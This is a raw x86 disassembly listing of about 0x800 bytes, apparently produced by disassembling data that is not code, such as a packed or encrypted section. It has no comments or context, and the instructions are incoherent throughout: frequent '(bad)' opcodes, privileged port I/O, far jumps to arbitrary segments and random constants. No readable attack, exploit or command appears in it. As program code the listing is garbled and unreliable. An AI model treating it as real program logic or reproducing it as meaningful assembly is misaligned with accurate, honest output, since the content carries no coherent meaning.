  4130e3:	xor    ch,BYTE PTR [edx*2-0x4f72b1d6]
  4130ea:	fidivr DWORD PTR [eax]
  4130ec:	mov    esi,0x4dca708f
  4130f1:	hlt    
  4130f2:	cs call 0xf71a4104
  4130f8:	data16 hlt 
  4130fa:	pop    ecx
  4130fb:	add    eax,0x14e3b721
  413100:	push   es
  413101:	stc    
  413102:	les    esi,FWORD PTR [edx-0x1d]
  413105:	fisttp DWORD PTR [esp+ebp*1-0x40]
  413109:	mov    eax,ds:0xe8d2f88d
  41310e:	dec    edx
  41310f:	and    dh,BYTE PTR [ecx-0x18b6353a]
  413115:	xchg   edx,eax
  413116:	scas   al,BYTE PTR es:[edi]
  413117:	int    0xde
  413119:	cs ins BYTE PTR es:[edi],dx
  41311b:	dec    esp
  41311d:	loope  0x41313c
  41311f:	xchg   edx,eax
  413120:	dec    eax
  413121:	jl     0x41317f
  413123:	adc    esp,DWORD PTR [esi]
  413125:	pop    edi
  413126:	sub    DWORD PTR [ebx+0x7a3d42a],0xd
  41312d:	in     al,0x21
  41312f:	mov    DWORD PTR [edx-0x7b484ed3],esi
  413135:	data16 lods al,BYTE PTR ds:[esi]
  413137:	cli    
  413138:	adc    bh,BYTE PTR [ebp+0x11df9152]
  41313e:	ss mov dh,0xa
  413141:	outs   dx,BYTE PTR ds:[esi]
  413142:	xchg   ecx,eax
  413143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413144:	jmp    0x83f83b02
  413149:	add    al,0x16
  41314b:	pop    es
  41314c:	jl     0x413128
  41314e:	shl    BYTE PTR cs:[esi],1
  413151:	or     al,0xf7
  413153:	enter  0x2533,0x11
  413157:	daa    
  413158:	and    bh,0x45
  41315b:	lock add eax,0xf8a964da
  413161:	ds dec edx
  413163:	dec    ebx
  413164:	xor    al,0x11
  413166:	and    DWORD PTR [esi-0x4866b958],edi
  41316c:	data16 add al,0xa9
  41316f:	fwait
  413170:	push   eax
  413171:	stc    
  413172:	adc    ah,bl
  413174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413175:	in     al,dx
  413176:	sub    DWORD PTR [ebp+ebx*2-0x2c],ebx
  41317a:	call   0x875a6d2
  41317f:	and    al,0x55
  413181:	std    
  413182:	cmp    ebp,DWORD PTR [edi+ebx*4-0x4e]
  413186:	retf   
  413187:	pop    es
  413188:	mov    esi,ss
  41318a:	pop    ebx
  41318b:	clc    
  41318c:	fistp  WORD PTR [esi]
  41318e:	adc    eax,0xffa03f8e
  413193:	dec    eax
  413194:	dec    ecx
  413195:	jns    0x4131cd
  413197:	rol    DWORD PTR [ebx-0x20],1
  41319a:	xchg   ebp,eax
  41319b:	or     al,0xbe
  41319d:	add    BYTE PTR [edx-0x5d],ah
  4131a0:	stc    
  4131a1:	add    eax,DWORD PTR [edx+0x38c0713d]
  4131a7:	sub    cl,ch
  4131a9:	ret    
  4131aa:	push   ss
  4131ab:	dec    esp
  4131ac:	pop    ds
  4131ad:	jne    0x41321a
  4131af:	mov    eax,ds:0x3a1e55a8
  4131b4:	mov    ds:0xe13b89a4,al
  4131b9:	ss inc ecx
  4131bb:	jl     0x413201
  4131bd:	or     dh,BYTE PTR [ebp-0x7f]
  4131c0:	jmp    0x95c80c45
  4131c5:	xor    BYTE PTR [ecx],dl
  4131c7:	sar    DWORD PTR [edi+0x4909cf05],cl
  4131cd:	imul   DWORD PTR [esi+esi*4]
  4131d0:	addr16 hlt 
  4131d2:	xor    BYTE PTR [ebp+0x10233011],dh
  4131d8:	retf   0xb2e6
  4131db:	jl     0x413198
  4131dd:	mov    cl,0xb
  4131df:	enter  0x5011,0x7e
  4131e3:	retf   0xbcf7
  4131e6:	dec    ebx
  4131e7:	fwait
  4131e8:	jne    0x413190
  4131ea:	stos   DWORD PTR es:[edi],eax
  4131eb:	xchg   edx,eax
  4131ec:	pop    ecx
  4131ed:	sahf   
  4131ee:	fist   WORD PTR [ecx-0x63792d89]
  4131f4:	mov    ah,0xb6
  4131f6:	loopne 0x413186
  4131f8:	inc    esp
  4131f9:	mov    al,ds:0x7294da62
  4131fe:	addr16 add eax,0xdc9dc140
  413204:	popf   
  413205:	xor    al,0xae
  413207:	or     DWORD PTR [edi+0x59494b9d],esi
  41320d:	aam    0x13
  41320f:	iret   
  413210:	mov    eax,0x3528f317
  413215:	jbe    0x413217
  413217:	cdq    
  413218:	jno    0x413241
  41321a:	sub    dl,ah
  41321c:	inc    edx
  41321d:	int    0xbc
  41321f:	lds    esi,FWORD PTR [esi+0x1b6a3c66]
  413225:	fs pusha 
  413227:	mov    ch,0x4c
  413229:	push   edx
  41322a:	mov    bh,0xd8
  41322c:	enter  0x80a5,0x20
  413230:	mov    ds,WORD PTR [ebx]
  413232:	xchg   edx,eax
  413233:	retf   
  413234:	sti    
  413235:	pop    ebx
  413236:	cmp    ah,BYTE PTR [edx-0x22]
  413239:	add    cl,BYTE PTR [esi-0x74]
  41323c:	xor    BYTE PTR [esi-0x715df0b],0x72
  413243:	mov    bl,0xba
  413245:	mov    bl,0x9b
  413247:	test   BYTE PTR [ecx+0x5],bh
  41324a:	pop    ebx
  41324b:	push   0xffffffca
  41324d:	in     al,0xa7
  41324f:	inc    eax
  413250:	sti    
  413251:	fcmovbe st,st(0)
  413253:	jp     0x41326f
  413255:	lahf   
  413256:	sbb    DWORD PTR [ecx+0x75],edi
  413259:	pop    ebp
  41325a:	call   0x5c215863
  41325f:	sub    DWORD PTR [edx],eax
  413261:	or     eax,0xdd6fb35e
  413266:	gs mov cl,0xee
  413269:	fadd   st,st(6)
  41326b:	dec    ecx
  41326c:	repz sbb BYTE PTR [eax+0x39],dh
  413270:	xchg   edx,eax
  413271:	mov    ?,WORD PTR [eax+edi*1]
  413274:	cwde   
  413275:	mov    ds:0xedf65b5,eax
  41327a:	mov    dh,0x33
  41327c:	or     ch,al
  41327e:	mov    DWORD PTR [ebp+0x7aeb8277],esi
  413284:	xchg   DWORD PTR [ebx],esi
  413286:	leave  
  413287:	into   
  413288:	outs   dx,DWORD PTR ds:[esi]
  413289:	in     eax,dx
  41328a:	push   edi
  41328b:	add    ebx,ebx
  41328d:	jle    0x413305
  41328f:	call   DWORD PTR [edx*4+0x22ccd236]
  413297:	or     edx,ebx
  413299:	cmp    eax,0x71063e5b
  41329e:	sub    BYTE PTR [eax],dl
  4132a0:	imul   ebp,DWORD PTR [ebp+0x1798cd7b],0xbd41c095
  4132aa:	js     0x4132c6
  4132ac:	sbb    al,0x8
  4132ae:	lock adc DWORD PTR [ecx],ecx
  4132b1:	dec    edx
  4132b2:	(bad)  
  4132b3:	jae    0x4132ec
  4132b5:	sar    DWORD PTR [esi-0x69362543],0x52
  4132bc:	xor    ecx,DWORD PTR [esi+eax*1]
  4132bf:	in     eax,dx
  4132c0:	add    BYTE PTR [ebp-0x622ca284],bl
  4132c6:	push   es
  4132c7:	push   es
  4132c8:	cs pop ecx
  4132ca:	ins    BYTE PTR es:[edi],dx
  4132cb:	mov    BYTE PTR es:[esi+0x5962b3ba],cl
  4132d2:	fimul  DWORD PTR [ebx-0x145f46a4]
  4132d8:	hlt    
  4132d9:	mov    eax,ds:0xea322d2
  4132de:	aas    
  4132df:	addr16 jne 0x4132f4
  4132e2:	jbe    0x413295
  4132e4:	push   edi
  4132e5:	jmp    0x5d9e:0x2156bc47
  4132ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ed:	hlt    
  4132ee:	mov    eax,0x3ea0deb4
  4132f3:	jbe    0x41327e
  4132f5:	loop   0x413362
  4132f7:	sub    ebx,DWORD PTR [eax-0x33b1e3c0]
  4132fd:	push   ds
  4132fe:	or     esi,DWORD PTR [ebx+0x65]
  413301:	mov    bh,0x4e
  413303:	push   ebx
  413304:	sti    
  413305:	sti    
  413306:	int3   
  413307:	xchg   esp,ebp
  413309:	les    esp,FWORD PTR [edi+ebp*8-0x70]
  41330d:	leave  
  41330e:	call   0xe1182c0d
  413313:	(bad)  
  413314:	call   0x2b66aab1
  413319:	into   
  41331a:	xchg   ebx,eax
  41331b:	and    eax,0x90ccefe8
  413320:	hlt    
  413321:	js     0x413383
  413323:	retf   
  413324:	mov    bh,BYTE PTR [edi+0x44]
  413327:	loopne 0x4132d4
  413329:	xor    DWORD PTR [ebx+edi*4-0x6d858d55],esi
  413330:	scas   al,BYTE PTR es:[edi]
  413331:	scas   al,BYTE PTR es:[edi]
  413332:	fadd   st,st(6)
  413334:	leave  
  413335:	mov    edi,0xb7489083
  41333a:	mov    ah,0xa
  41333c:	inc    esi
  41333d:	or     al,BYTE PTR [edi-0x5f]
  413340:	pusha  
  413341:	lock leave 
  413343:	pop    edi
  413344:	fsubp  st(3),st
  413346:	add    esi,edx
  413348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413349:	sub    DWORD PTR [ebp-0x48],ebp
  41334c:	into   
  41334d:	(bad)  
  41334e:	imul   ebp,DWORD PTR es:[edi-0x338ea8a],0x64
  413356:	in     eax,0xb5
  413358:	mov    eax,ds:0xfd326479
  41335d:	pop    ecx
  41335e:	aad    0xb2
  413360:	xchg   DWORD PTR [eax],esp
  413362:	mov    dl,0x4
  413364:	pop    ds
  413365:	lahf   
  413366:	inc    esi
  413367:	pop    esi
  413368:	stos   DWORD PTR es:[edi],eax
  413369:	mov    esi,0x5b48bea9
  41336e:	mov    dh,0x3c
  413370:	push   gs
  413372:	and    bl,BYTE PTR [edx+ebx*4+0x47]
  413376:	(bad)  
  413377:	sbb    eax,0xdbd21309
  41337c:	bound  edi,QWORD PTR [ecx]
  41337e:	outs   dx,BYTE PTR ds:[esi]
  41337f:	mov    eax,ds:0x8634ba89
  413384:	sub    bl,BYTE PTR [edi-0x5e21919d]
  41338a:	(bad)  
  41338b:	iret   
  41338c:	outs   dx,BYTE PTR ds:[esi]
  41338d:	sbb    DWORD PTR [ecx-0x75a34cad],esi
  413393:	cmp    BYTE PTR [esi+eax*2+0x59],ch
  413397:	xchg   esp,eax
  413398:	gs mov ebx,0x22bdff33
  41339e:	rol    DWORD PTR [ebp-0x6af9f8f9],cl
  4133a4:	stc    
  4133a5:	jae    0x413420
  4133a7:	cmp    ch,BYTE PTR [ebx]
  4133a9:	test   ebx,ebx
  4133ab:	ror    BYTE PTR [edi],cl
  4133ad:	xchg   edi,eax
  4133ae:	pushf  
  4133af:	imul   edi
  4133b1:	adc    bl,BYTE PTR [ecx+0x757b8198]
  4133b7:	fidiv  DWORD PTR [ebx+0x16d5e7b]
  4133bd:	bound  eax,QWORD PTR fs:[edi-0x1e13abce]
  4133c4:	mov    esi,0xf8e9e377
  4133c9:	cmp    al,0x2e
  4133cb:	push   bx
  4133cd:	inc    edx
  4133ce:	inc    di
  4133d0:	jno    0x413440
  4133d2:	fnstcw WORD PTR [esi-0x39609dfb]
  4133d8:	dec    ecx
  4133d9:	xlat   BYTE PTR ds:[ebx]
  4133da:	adc    DWORD PTR [ebp+0x27bdbe07],edx
  4133e0:	jl     0x4133f6
  4133e2:	mov    al,0x9f
  4133e4:	outs   dx,DWORD PTR ds:[esi]
  4133e5:	jg     0x4133d2
  4133e7:	push   ebp
  4133e8:	nop
  4133e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ea:	and    DWORD PTR [eax+0x6e284e58],esi
  4133f0:	adc    al,0x19
  4133f2:	xchg   edi,eax
  4133f3:	nop
  4133f4:	stc    
  4133f5:	dec    ebx
  4133f6:	fist   DWORD PTR [ebx+0x5b]
  4133f9:	std    
  4133fa:	add    BYTE PTR [edi+eax*4-0x5d],cl
  4133fe:	mov    al,ds:0xe2566126
  413403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413404:	mov    esi,0x6b5b26cf
  413409:	jp     0x413473
  41340b:	(bad)  
  41340d:	idiv   BYTE PTR [ecx]
  41340f:	and    al,0xb6
  413411:	jge    0x4133b6
  413413:	add    BYTE PTR [eax+0x6e150854],ah
  413419:	out    0xb0,al
  41341b:	lea    eax,gs:[ebp+ebx*1+0x3e13c5d]
  413423:	fwait
  413424:	mov    ch,0x20
  413426:	call   0x285f768b
  41342b:	test   al,0x2b
  41342d:	jg     0x4133ce
  41342f:	lahf   
  413430:	jnp    0x41349b
  413432:	pusha  
  413433:	repnz cmp DWORD PTR [ebx+0xe],ebx
  413437:	outs   dx,DWORD PTR ds:[esi]
  413438:	push   ebp
  413439:	out    dx,eax
  41343a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41343c:	(bad)  
  41343d:	fnstsw WORD PTR [ebx-0x79a03cb0]
  413443:	sti    
  413444:	sahf   
  413445:	dec    edx
  413446:	add    cl,BYTE PTR [eax+0x7]
  413449:	fs pop ecx
  41344b:	dec    ebp
  41344c:	dec    esp
  41344d:	mov    BYTE PTR ds:0xfaa229a9,ch
  413453:	sti    
  413454:	call   0x6130465d
  413459:	sar    DWORD PTR ds:0xb299831e,cl
  41345f:	out    dx,eax
  413460:	out    0xcb,al
  413462:	lods   eax,DWORD PTR ds:[esi]
  413463:	jg     0x4134e2
  413465:	call   FWORD PTR [edi]
  413467:	mov    DWORD PTR [ebx],ebx
  413469:	sahf   
  41346a:	shl    BYTE PTR [esi+ecx*2],1
  41346d:	mov    bl,0x25
  41346f:	mov    dh,al
  413471:	sub    ah,bh
  413473:	in     eax,dx
  413474:	push   0xc10b9835
  413479:	fldcw  WORD PTR [eax+0x40a5298c]
  41347f:	push   esi
  413480:	push   ss
  413481:	add    al,0xef
  413483:	jmp    0x9579:0xa8347097
  41348a:	inc    edx
  41348b:	sub    bl,BYTE PTR [esi+0xe0e202a]
  413491:	add    al,0xc6
  413493:	out    dx,al
  413494:	fcmovne st,st(7)
  413496:	sub    BYTE PTR [edi],dl
  413498:	pop    ecx
  413499:	rcr    ch,0xc1
  41349c:	adc    dh,BYTE PTR [eax-0x38]
  41349f:	xor    DWORD PTR [edx-0x6],edx
  4134a2:	xor    al,0xdb
  4134a4:	dec    ebp
  4134a5:	out    0x1f,eax
  4134a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134a8:	(bad)  [eax-0x4d]
  4134ab:	sub    edi,ecx
  4134ad:	xor    ecx,0xffffffaf
  4134b0:	ror    DWORD PTR ds:0x7e8a291a,0x2b
  4134b7:	fist   DWORD PTR [edi]
  4134b9:	fist   DWORD PTR [esi]
  4134bb:	sbb    eax,esp
  4134bd:	xor    dh,ah
  4134bf:	and    edi,esp
  4134c1:	dec    esi
  4134c2:	loopne 0x41344b
  4134c4:	fsubr  QWORD PTR [esp+edi*2+0x69dc928d]
  4134cb:	ret    
  4134cc:	inc    DWORD PTR [edx]
  4134ce:	xor    al,0x74
  4134d0:	jbe    0x41352a
  4134d2:	push   ds
  4134d3:	xchg   DWORD PTR [eax],edi
  4134d5:	or     DWORD PTR [ebp+0x4e],0x76b1189
  4134dc:	je     0x41349e
  4134de:	out    0x89,eax
  4134e0:	(bad)  
  4134e1:	mov    cl,0xbb
  4134e3:	addr16 jge 0x4134fd
  4134e6:	(bad)  
  4134e7:	mov    ds:0x97f1642a,eax
  4134ec:	push   cs
  4134ed:	jecxz  0x41356d
  4134ef:	xor    eax,0xe0ab59d6
  4134f4:	mov    cl,0x34
  4134f6:	mov    ch,0xf2
  4134f8:	push   eax
  4134f9:	loop   0x4134b6
  4134fb:	rcl    dh,1
  4134fd:	(bad)  [ecx+edx*1-0x3655fa64]
  413504:	jge    0x41354f
  413506:	adc    DWORD PTR [edi+0x2],esp
  413509:	pushf  
  41350a:	mov    ds:0xd685d184,al
  41350f:	adc    al,0x68
  413511:	das    
  413512:	fld    TBYTE PTR [ebx]
  413514:	sub    eax,0x6ffdba6c
  413519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41351a:	ror    BYTE PTR [edx-0x21e94ce9],0x2e
  413521:	jmp    0x41357e
  413523:	and    al,dh
  413525:	inc    ebx
  413526:	add    al,0x8e
  413528:	sub    bh,bl
  41352a:	fwait
  41352b:	mov    eax,0x1fbab320
  413530:	and    BYTE PTR [ecx-0x12],ah
  413533:	arpl   WORD PTR [ebx],cx
  413535:	in     eax,dx
  413536:	mov    ebp,0xcddbd008
  41353b:	jnp    0x413506
  41353d:	imul   esi,DWORD PTR [eax-0x59],0xffffffb9
  413541:	cmp    eax,0x7f531e5f
  413546:	add    DWORD PTR ds:0xf67195bb,esp
  41354c:	jnp    0x41355f
  41354e:	fadd   DWORD PTR [ebx+ecx*2-0x313e4f92]
  413555:	jnp    0x4134f4
  413557:	sbb    edx,0x4
  41355a:	mov    bl,0xf1
  41355c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41355d:	mov    bh,BYTE PTR [ecx]
  41355f:	ins    DWORD PTR es:[edi],dx
  413560:	(bad)  
  413562:	imul   edi,edx,0xffffffbe
  413565:	push   ecx
  413566:	sbb    eax,0xd3fb38c7
  41356b:	jl     0x4135c8
  41356d:	pushf  
  41356e:	call   0x6c82:0x2c388851
  413575:	daa    
  413576:	push   0xfffffffc
  413578:	arpl   WORD PTR [ebx+eiz*1+0x20244084],ax
  41357f:	(bad)
  413582:	icebp  
  413583:	jns    0x4135a0
  413585:	aam    0x7e
  413587:	vpmacswd ymm12,ymm2,ymm6,ymm0
  41358d:	std    
  41358e:	(bad)  
  41358f:	xchg   esi,eax
  413590:	mov    ah,0x62
  413592:	push   0xffffffe5
  413594:	cdq    
  413595:	sub    al,0x8d
  413597:	into   
  413598:	jmp    FWORD PTR [eax]
  41359a:	imul   edx,ecx,0x115417bd
  4135a0:	(bad)  
  4135a2:	cmp    esp,DWORD PTR [edx+0x3bbf5a60]
  4135a8:	(bad)  
  4135a9:	fs inc esi
  4135ab:	add    al,0xb6
  4135ad:	jl     0x41355f
  4135af:	rcl    BYTE PTR [ebx-0x6a],cl
  4135b2:	mov    ecx,0x56995cbc
  4135b7:	mov    ebp,0xbf0801c3
  4135bc:	mov    al,0xa5
  4135be:	ins    DWORD PTR es:[edi],dx
  4135bf:	or     eax,ecx
  4135c1:	xchg   ebp,eax
  4135c2:	and    al,0x8e
  4135c4:	sbb    cl,bh
  4135c6:	xor    edx,ebp
  4135c8:	int3   
  4135c9:	mov    al,0xf4
  4135cb:	mov    edx,0xfca78dde
  4135d0:	push   cs
  4135d1:	sbb    ebx,esi
  4135d3:	not    DWORD PTR [edx-0x9bf42b6]
  4135d9:	sub    BYTE PTR [edi+ecx*2+0x3a],cl
  4135dd:	out    dx,eax
  4135de:	xchg   esp,eax
  4135df:	es pop ebp
  4135e1:	pop    ecx
  4135e2:	in     al,0x9e
  4135e4:	call   0xe982:0xac5d2c9b
  4135eb:	xchg   ecx,eax
  4135ec:	test   DWORD PTR [ebp-0x4c],edi
  4135ef:	jnp    0x4135c7
  4135f1:	xchg   DWORD PTR [edx+0x21],esp
  4135f4:	sahf   
  4135f5:	retf   0xc71b
  4135f8:	call   0x45a95bdc
  4135fd:	jmp    FWORD PTR [ecx-0x31c5e548]
  413603:	sbb    BYTE PTR [esi+0x71911770],bl
  413609:	push   esp
  41360a:	(bad)  
  41360b:	pop    eax
  41360c:	xor    al,0x11
  41360e:	lds    edi,FWORD PTR [edx+ebp*1+0x2]
  413612:	or     DWORD PTR [edi+0x15],0xf39518ca
  413619:	xchg   bh,al
  41361b:	mov    dh,0x47
  41361d:	lods   al,BYTE PTR ds:[esi]
  41361e:	push   edx
  41361f:	mov    ch,0xbf
  413621:	or     dh,BYTE PTR [ecx-0x5b]
  413624:	or     DWORD PTR [ebx+0x52],edx
  413627:	xchg   edx,eax
  413628:	sar    DWORD PTR [ecx-0x38763623],0xf4
  41362f:	adc    DWORD PTR [ebp-0x5f],0xd9334a41
  413636:	pop    edx
  413637:	xchg   ebp,eax
  413638:	push   esp
  413639:	lahf   
  41363a:	cld    
  41363b:	sbb    al,0x3d
  41363d:	outs   dx,DWORD PTR ds:[esi]
  41363e:	out    dx,al
  41363f:	sub    al,0x19
  413641:	mov    esp,DWORD PTR [eax]
  413643:	int    0x5a
  413645:	push   es
  413646:	in     al,dx
  413647:	sub    BYTE PTR [esi-0x5],dl
  41364a:	in     al,dx
  41364b:	xchg   ebx,eax
  41364c:	adc    eax,0x69bd836
  413651:	outs   dx,DWORD PTR ds:[esi]
  413652:	mov    cl,0x9
  413654:	hlt    
  413655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413656:	pop    ebx
  413657:	adc    bl,BYTE PTR [esi]
  413659:	test   BYTE PTR [eax+ecx*4],bl
  41365c:	icebp  
  41365d:	sti    
  41365e:	(bad)  
  41365f:	pop    ecx
  413660:	xchg   esi,eax
  413661:	add    bl,dh
  413663:	aaa    
  413664:	enter  0xc2f8,0xc
  413668:	push   ebp
  413669:	cmp    dh,BYTE PTR [ebx]
  41366b:	or     BYTE PTR ds:0xb3ffc564,ah
  413671:	jb     0x413691
  413673:	mov    al,ds:0x9bd35931
  413678:	ins    DWORD PTR es:[edi],dx
  413679:	cmp    esp,DWORD PTR [edx]
  41367b:	pop    ecx
  41367c:	(bad)  
  41367e:	pop    ss
  41367f:	push   0x45
  413681:	mov    eax,ds:0x607c044
  413686:	cmp    edx,DWORD PTR [esi]
  413688:	outs   dx,BYTE PTR ds:[esi]
  413689:	jg     0x4136d1
  41368b:	test   BYTE PTR [ebx],dh
  41368d:	or     BYTE PTR [ebp-0x35e918bc],dl
  413693:	mov    esp,0x4f75a1f2
  413698:	out    dx,al
  413699:	cld    
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	test   DWORD PTR [ecx-0x5d],ebp
  41369e:	adc    esp,DWORD PTR [edx+0x1d]
  4136a1:	cld    
  4136a2:	sahf   
  4136a3:	cmp    edx,DWORD PTR [edi]
  4136a5:	call   0x86b2:0x661aff8a
  4136ac:	add    edx,DWORD PTR [edi]
  4136ae:	shl    BYTE PTR [edx-0x15a4287d],cl
  4136b4:	xor    BYTE PTR ds:0x219086d9,ch
  4136ba:	dec    ecx
  4136bb:	sub    DWORD PTR [ecx],ecx
  4136bd:	adc    al,0xcc
  4136bf:	cmp    al,0xc
  4136c1:	xor    DWORD PTR [ebx-0x53],esp
  4136c4:	mov    ebx,0xdbb543a7
  4136c9:	fisttp WORD PTR [ebp-0x3d]
  4136cc:	jne    0x413666
  4136ce:	xor    al,0x8e
  4136d0:	test   eax,0x15bc80dd
  4136d5:	lahf   
  4136d6:	daa    
  4136d7:	stos   BYTE PTR es:[edi],al
  4136d8:	adc    ch,cl
  4136da:	jp     0x413700
  4136dc:	and    ebx,edi
  4136de:	jge    0x4136bd
  4136e0:	sbb    DWORD PTR [esi],0xffffffbf
  4136e3:	jne    0x413692
  4136e5:	or     dl,BYTE PTR [edx-0x6c2e2deb]
  4136eb:	xor    DWORD PTR [edi-0x9],esi
  4136ee:	test   DWORD PTR [ecx+eiz*4],eax
  4136f1:	stos   DWORD PTR es:[edi],eax
  4136f2:	adc    edi,DWORD PTR [edi+eax*1-0x61acbd62]
  4136f9:	dec    ebp
  4136fa:	mov    eax,0x9d15c2b6
  4136ff:	pop    edi
  413700:	fwait
  413701:	add    al,0x31
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	mov    bh,BYTE PTR [ebp*1+0x725bae68]
  41370b:	add    bl,ah
  41370d:	dec    edx
  41370e:	push   esi
  41370f:	jb     0x413767
  413711:	(bad)  
  413713:	jecxz  0x41373b
  413715:	pop    esp
  413716:	js     0x413771
  413718:	inc    ebx
  413719:	adc    ebx,ebp
  41371b:	ja     0x413710
  41371d:	dec    ebp
  41371e:	test   cl,bh
  413720:	aad    0xda
  413722:	in     eax,0x87
  413724:	mov    ds:0x7f9ef1a6,al
  413729:	lock xchg ebx,eax
  41372b:	sahf   
  41372c:	xlat   BYTE PTR ds:[ebx]
  41372d:	scas   al,BYTE PTR es:[edi]
  41372e:	jp     0x41370f
  413730:	aam    0xbd
  413732:	scas   eax,DWORD PTR es:[edi]
  413733:	call   0x9c0e:0x1efaba42
  41373a:	and    DWORD PTR [eax-0x42],eax
  41373d:	sub    eax,0x871d31fb
  413742:	in     al,dx
  413743:	(bad)  
  413744:	adc    esp,DWORD PTR [edi-0x69]
  413747:	mov    DWORD PTR [ecx-0x12927853],esi
  41374d:	mov    dl,0x33
  41374f:	fs jb  0x413749
  413752:	and    eax,0xa37bb40b
  413757:	out    0x7d,eax
  413759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41375a:	in     eax,0xe4
  41375c:	push   esp
  41375d:	mov    ds:0x5bd9e3a8,al
  413762:	xor    bl,BYTE PTR [eax+0x40]
  413765:	icebp  
  413766:	fbstp  TBYTE PTR [ebx]
  413768:	and    DWORD PTR [ecx+0x3524eda2],ecx
  41376e:	pop    ebp
  41376f:	popf   
  413770:	idiv   DWORD PTR [edi]
  413772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413773:	js     0x4137a0
  413775:	push   eax
  413776:	retf   0xb8a9
  413779:	mov    ds:0x8c9de1dc,al
  41377e:	dec    ecx
  41377f:	jo     0x413740
  413781:	in     al,dx
  413782:	or     DWORD PTR [edi],ebp
  413784:	pop    ss
  413785:	cmc    
  413786:	dec    esi
  413787:	cmp    ebx,DWORD PTR cs:[eax+0x30de6058]
  41378e:	push   es
  41378f:	cmp    eax,0xe17d54a6
  413794:	pushf  
  413795:	call   0x5d7f7b70
  41379a:	dec    ecx
  41379b:	fisub  WORD PTR fs:[edx]
  41379e:	mov    WORD PTR ds:0x20c1be7a,?
  4137a4:	lds    ebx,FWORD PTR [edx-0x44]
  4137a7:	ins    DWORD PTR es:[edi],dx
  4137a8:	xor    DWORD PTR ds:0x10c52dc0,ebp
  4137ae:	inc    eax
  4137af:	inc    esp
  4137b0:	es mov edx,0x2100012e
  4137b6:	in     al,dx
  4137b7:	(bad)  
  4137b8:	mov    gs,WORD PTR [ecx+esi*4+0x271ca6bb]
  4137bf:	push   es
  4137c0:	jne    0x413800
  4137c2:	and    bl,dh
  4137c4:	cmp    BYTE PTR [ebx-0x437ff8eb],0x75
  4137cb:	mov    ds:0x6625d7c4,eax
  4137d0:	aas    
  4137d1:	mov    ebp,0x73f611d4
  4137d6:	dec    edi
  4137d7:	out    0x51,al
  4137d9:	das    
  4137da:	out    0x36,al
  4137dc:	xor    al,0x3
  4137de:	out    0x91,eax
  4137e0:	out    dx,al
  4137e1:	fcom   DWORD PTR [ebp-0x1]
  4137e4:	rcl    BYTE PTR [esi],cl
  4137e6:	xchg   ecx,eax
  4137e7:	lods   eax,DWORD PTR ds:[esi]
  4137e8:	mov    edi,0x53bad090
  4137ed:	aad    0x5f
  4137ef:	(bad)  
  4137f0:	cwde   
  4137f1:	call   0xde40:0x1ce28317
  4137f8:	aad    0xd0
  4137fa:	popa   
  4137fb:	es pop ebp
  4137fd:	sti    
  4137fe:	and    DWORD PTR [ebx+0x22],esi
  413801:	aas    
  413802:	push   edx
  413803:	adc    ecx,DWORD PTR [ecx-0x5b]
  413806:	rol    DWORD PTR [ebx-0x56],cl
  413809:	cs jno 0x413884
  41380c:	jge    0x413861
  41380e:	leave  
  41380f:	std    
  413810:	inc    edx
  413811:	mov    WORD PTR [ebx],?
  413813:	(bad)  
  413814:	push   ebp
  413815:	rcr    DWORD PTR [ebp+0xa756533],cl
  41381b:	rol    eax,cl
  41381d:	cli    
  41381e:	dec    ebp
  41381f:	sub    BYTE PTR [esp+eiz*2],ch
  413822:	enter  0x8c70,0xd4
  413826:	jns    0x41381c
  413828:	pusha  
  413829:	ss dec ebp
  41382b:	int    0x68
  41382d:	in     al,0x4d
  41382f:	jg     0x41380d
  413831:	sub    esp,ecx
  413833:	cwde   
  413834:	or     BYTE PTR [ecx+0x5146b7f3],bh
  41383a:	push   eax
  41383b:	faddp  st(2),st
  41383d:	call   0x589c:0x7dfed8ce
  413844:	jae    0x4137e2
  413846:	mov    bh,BYTE PTR [eax+eax*2+0x261e9478]
  41384d:	(bad)  
  41384e:	sbb    eax,0x4da66e65
  413853:	js     0x41380e
  413855:	test   eax,0x55a621d6
  41385a:	mov    ah,0x8e
  41385c:	(bad)  
  41385d:	sahf   
  41385e:	inc    esp
  41385f:	xchg   ebx,eax
  413861:	push   esp
  413862:	mov    dh,BYTE PTR [esi+0x56]
  413865:	jmp    0xa364:0x1bf1125c
  41386c:	add    DWORD PTR [ebx+0x6c],esp
  41386f:	mov    bl,0xfa
  413871:	mov    ecx,0x22b37e68
  413876:	push   ebx
  413877:	adc    eax,0xc2f1872f
  41387c:	cmp    eax,0x5d7a30f9
  413881:	and    bh,bl
  413883:	and    al,0x63
  413885:	outs   dx,BYTE PTR ds:[esi]
  413886:	or     cl,BYTE PTR [ebx+0x1c4cc86a]
  41388c:	jmp    0x7a94:0x2f2a389d
  413893:	hlt    
  413894:	mov    dl,0x40
  413896:	aaa    
  413897:	add    DWORD PTR [eax],ebx
  413899:	lock dec esp
  41389b:	ja     0x4138eb
  41389d:	test   eax,0x50ae281a
  4138a2:	repnz push esi
  4138a4:	pop    gs
  4138a6:	call   0xf33e:0x7f322493
  4138ad:	das    
  4138ae:	inc    esi
  4138af:	in     eax,0xee
  4138b1:	pop    edi
  4138b2:	popa   
  4138b3:	mov    bl,0xbf
  4138b5:	rcl    DWORD PTR [ecx+0x70],cl
  4138b8:	pop    ss
  4138b9:	xchg   esi,eax
  4138ba:	xor    eax,0x6e6a94b2
  4138bf:	sub    DWORD PTR [ebx],0xffffff86
  4138c2:	sahf   
  4138c3:	enter  0xb5f3,0xa7
  4138c7:	sbb    eax,0x1af695a6
  4138cc:	cmp    BYTE PTR [ebp+0x3d],bh
  4138cf:	xor    dl,BYTE PTR [edi+0x3f]
  4138d2:	repnz or al,ah
  4138d5:	das    
  4138d6:	push   0x2b2a18f0
